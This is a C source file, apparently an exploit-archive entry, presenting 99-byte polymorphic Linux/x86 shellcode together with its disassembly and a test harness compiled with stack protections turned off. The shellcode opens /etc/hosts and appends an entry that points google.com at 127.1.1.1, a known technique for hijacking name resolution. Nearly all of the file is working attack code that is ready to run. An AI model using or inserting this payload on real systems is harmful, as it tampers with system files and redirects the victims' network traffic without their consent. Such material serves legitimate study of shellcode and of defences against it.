/*
    # Title: Linux/86 - File Modification(/etc/hosts) Polymorphic Shellcode (99 bytes)
    # Date: 2018-09-13
    # Author: Ray Doyle (@doylersec)
    # Tested on: Linux/x86
    # gcc -o poly_hosts_shellcode -z execstack -fno-stack-protector poly_hosts_shellcode.c
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	29 c9                	sub    ecx,ecx
 8048062:	51                   	push   ecx

08048063 <open>:
 8048063:	6a 05                	push   0x5
 8048065:	58                   	pop    eax
 8048066:	68 6f 73 74 73       	push   0x7374736f
 804806b:	68 74 63 2f 68       	push   0x682f6374
 8048070:	68 2f 2f 2f 65       	push   0x652f2f2f
 8048075:	54                   	push   esp
 8048076:	5b                   	pop    ebx
 8048077:	51                   	push   ecx
 8048078:	41                   	inc    ecx
 8048079:	b5 04                	mov    ch,0x4
 804807b:	cd 80                	int    0x80
 804807d:	93                   	xchg   ebx,eax
 804807e:	6a 04                	push   0x4
 8048080:	58                   	pop    eax

08048081 <write>:
 8048081:	68 2e 63 6f 6d       	push   0x6d6f632e
 8048086:	68 6f 67 6c 65       	push   0x656c676f
 804808b:	68 31 20 67 6f       	push   0x6f672031
 8048090:	68 31 2e 31 2e       	push   0x2e312e31
 8048095:	68 31 32 37 2e       	push   0x2e373231
 804809a:	54                   	push   esp
 804809b:	59                   	pop    ecx
 804809c:	6a 14                	push   0x14
 804809e:	5a                   	pop    edx
 804809f:	cd 80                	int    0x80

080480a1 <close>:
 80480a1:	92                   	xchg   edx,eax
 80480a2:	b0 06                	mov    al,0x6
 80480a4:	cd 80                	int    0x80

080480a6 <exit>:
 80480a6:	31 c0                	xor    eax,eax
 80480a8:	40                   	inc    eax
 80480a9:	cd 80                	int    0x80
****************************************************/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x29\xc9\x51\x6a\x05\x58\x68\x6f\x73\x74\x73\x68\x74\x63\x2f\x68\x68\x2f\x2f\x2f\x65\x54\x5b\x51\x41\xb5\x04\xcd\x80\x93\x6a\x04\x58\x68\x2e\x63\x6f\x6d\x68\x6f\x67\x6c\x65\x68\x31\x20\x67\x6f\x68\x31\x2e\x31\x2e\x68\x31\x32\x37\x2e\x54\x59\x6a\x14\x5a\xcd\x80\x92\xb0\x06\xcd\x80\x31\xc0\x40\xcd\x80";

main()
{
    printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}